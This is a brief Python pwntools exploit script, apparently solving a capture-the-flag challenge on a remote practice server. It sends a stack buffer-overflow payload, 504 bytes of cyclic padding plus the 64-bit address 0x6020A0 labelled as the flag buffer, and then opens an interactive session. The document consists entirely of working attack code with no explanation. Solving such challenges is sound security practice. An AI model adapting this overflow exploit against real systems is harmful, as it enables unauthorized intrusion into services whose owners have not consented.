from pwn import *
context(arch='amd64', os='linux',log_level='debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28242)
flag = 0x6020A0 #buf
io.recvuntil('Haha,It has reduced you a lot of difficulty!')
payload = cyclic(504) + p64(flag)
io.sendline(payload)
io.interactive()
